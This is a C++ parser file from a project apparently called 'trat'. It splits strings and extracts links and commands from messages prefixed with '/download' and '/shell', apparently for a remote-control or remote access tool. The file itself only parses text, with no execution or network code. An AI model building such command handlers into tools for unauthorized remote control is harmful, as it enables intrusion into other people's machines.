/* trat/src/parser.cpp */
#include "../include/parser.hpp"
#include <cstring>
#include <string>
#include <filesystem>

namespace trat
{

  namespace parser
  {

    PrefixSuffix* breakDownWord(const char* Word, const char* Seperator)
    {
      if  ((Word == nullptr) || (Seperator == nullptr ))
      {
        return nullptr;
      }
      PrefixSuffix* p_result = (PrefixSuffix*)malloc(sizeof(PrefixSuffix));
      if (p_result == nullptr)
      {
        return nullptr;
      }
      p_result->prefix = nullptr;
      p_result->suffix = nullptr;

      const char* separatorPos = strstr(Word, Seperator);
      if (!separatorPos)
      {
        free(p_result);
        p_result = nullptr;
        return nullptr;
      }
      size_t prefixLength = separatorPos - Word;
      size_t suffixLength = strlen(Word) - prefixLength - strlen(Seperator);

      if (prefixLength == 0)
      {
        p_result->prefix = strdup("");
      }
      else
      {
        p_result->prefix = (char*)malloc(prefixLength + 1);
        if (p_result->prefix == nullptr)
        {
          free(p_result);
          return nullptr;
        }
        strncpy(p_result->prefix, Word, prefixLength);
        p_result->prefix[prefixLength] = '\0';
      }
      if (suffixLength == 0)
      {
        p_result->suffix = strdup("");
      }
      else
      {
        p_result->suffix = (char*)malloc(suffixLength + 1);
        if (p_result->suffix == nullptr)
        {
          free(p_result->prefix);
          free(p_result);
          return nullptr;
        }
        strncpy(p_result->suffix, separatorPos + strlen(Seperator), suffixLength);
        p_result->suffix[suffixLength] = '\0';
      }
      return p_result;
    }

    void PrefixSuffix_destroy(PrefixSuffix *P_PrefixSuffix)
    {
      free(P_PrefixSuffix->suffix);
      P_PrefixSuffix->suffix = nullptr;

      free(P_PrefixSuffix->prefix);
      P_PrefixSuffix->prefix = nullptr;

      free(P_PrefixSuffix);
      P_PrefixSuffix = nullptr;
    }

    const char* extractDownloadLink(const char* Text)
    {
      const char* command_prefix = "/download ";
      size_t prefix_length = std::strlen(command_prefix);

      if (std::strncmp(Text, command_prefix, prefix_length) == 0)
      {
        const char* link = Text + prefix_length;
        if (std::strlen(link) > 0)
        {
          return link;
        }
      }
      return nullptr;
    }

    const char* extractShellCommand(const char* Text)
    {
      const char* command_prefix = "/shell";
      size_t prefix_length = std::strlen(command_prefix);
      if (std::strncmp(Text, command_prefix, prefix_length) == 0)
      {
        const char* command = Text + prefix_length;
        if(std::strlen(command) > 0)
        {
          return command;
        }
      }
      return nullptr;
    }

    const char* extractFileNameFromLink(const char* Link)
    {
      if (Link == nullptr || std::strlen(Link) == 0)
      {
        return nullptr;
      }

      const char* last_slash = std::strrchr(Link, '/');
      if (last_slash != nullptr)
      {
        return last_slash + 1;
      }

      return Link;
    }

    const char* extractFileExtensionFromLink(const char* Link)
    {
      const char* file_name = extractFileNameFromLink(Link);
      if (file_name == nullptr || std::strlen(file_name) == 0)
      {
        return nullptr;
      }

      const char* last_dot = std::strrchr(file_name, '.');
      if (last_dot != nullptr && *(last_dot + 1) != '\0')
      {
        return last_dot + 1;
      }

      return nullptr;
    }

    const char* constructFilePath(const char* Link)
    {
      if (Link == nullptr || std::strlen(Link) == 0)
      {
        return nullptr;
      }

      const char* file_name = extractFileNameFromLink(Link);
      if (file_name == nullptr || std::strlen(file_name) == 0)
      {
        return nullptr;
      }

      try
      {
        std::string current_path = std::filesystem::current_path().string();
        std::string full_path = current_path + "/" + file_name;
        char* result = new char[full_path.length() + 1];
        std::strcpy(result, full_path.c_str());
        return result;
      }
      catch (const std::exception& e)
      {
        return nullptr;
      }
    }

  }

}
